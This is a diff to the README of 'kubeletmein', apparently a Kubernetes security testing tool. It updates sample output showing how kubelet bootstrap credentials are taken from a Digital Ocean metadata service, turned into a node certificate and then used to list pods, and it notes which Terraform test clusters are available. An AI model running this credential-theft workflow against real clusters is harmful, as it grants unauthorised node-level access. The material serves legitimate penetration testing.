@@ -91,15 +91,17 @@ kubectl --kubeconfig kubeconfig get pods
 ### Digital Ocean
 
 ```
-~ $ kubeletmein do -n whatevs
-2018-12-12T23:34:19Z [ℹ]  fetching kubelet creds from metadata service
-2018-12-12T23:34:19Z [ℹ]  writing ca cert to: ca-certificates.crt
-2018-12-12T23:34:19Z [ℹ]  generating bootstrap-kubeconfig file at: bootstrap-kubeconfig
-2018-12-12T23:34:19Z [ℹ]  wrote bootstrap-kubeconfig
-2018-12-12T23:34:19Z [ℹ]  now generate a new node certificate with: kubeletmein do generate
-2018-12-12T23:36:46Z [ℹ]  using bootstrap-config to request new cert for node: whatevs
-2018-12-12T23:36:46Z [ℹ]  got new cert and wrote kubeconfig
-2018-12-12T23:36:46Z [ℹ]  now try: kubectl --kubeconfig kubeconfig get pods
+root@kubeletmein-vulnerable:/# kubeletmein do -n foo
+2021-03-04T23:39:46Z [ℹ]  fetching kubelet creds from metadata service
+2021-03-04T23:39:46Z [ℹ]  writing ca cert to: ca-certificates.crt
+2021-03-04T23:39:46Z [ℹ]  generating bootstrap-kubeconfig file at: bootstrap-kubeconfig
+2021-03-04T23:39:46Z [ℹ]  wrote bootstrap-kubeconfig
+2021-03-04T23:39:46Z [ℹ]  using bootstrap-config to request new cert for node: foo
+2021-03-04T23:39:46Z [ℹ]  got new cert and wrote kubeconfig
+2021-03-04T23:39:46Z [ℹ]  now try: kubectl --kubeconfig kubeconfig get pods
+root@kubeletmein-vulnerable:/# kubectl --kubeconfig kubeconfig get pods
+NAME                     READY   STATUS    RESTARTS   AGE
+kubeletmein-vulnerable   1/1     Running   0          6m12s
 ```
 
 ## Testing
@@ -114,7 +116,7 @@ To simplify the process, if you want to fire up some clusters to test this on, t
 
 - Digital Ocean - (https://registry.terraform.io/providers/digitalocean/digitalocean/latest/docs)[https://registry.terraform.io/providers/digitalocean/digitalocean/latest/docs]
 
-** NOTE - ONLY GKE IS CURRENTLY RELEASED, OTHERS ARE COMING VERY SOON **
+** NOTE - ONLY GKE and DIGITALOCEAN ARE CURRENTLY RELEASED, EKS IS COMING VERY SOON **
 
 Each folder has a `Makefile` you can use if you wish to init, plan and apply the configs. You can update the `terraform.tfvars` with the necessary changes or set `TF_VAR_xx` variables. However you prefer.
 
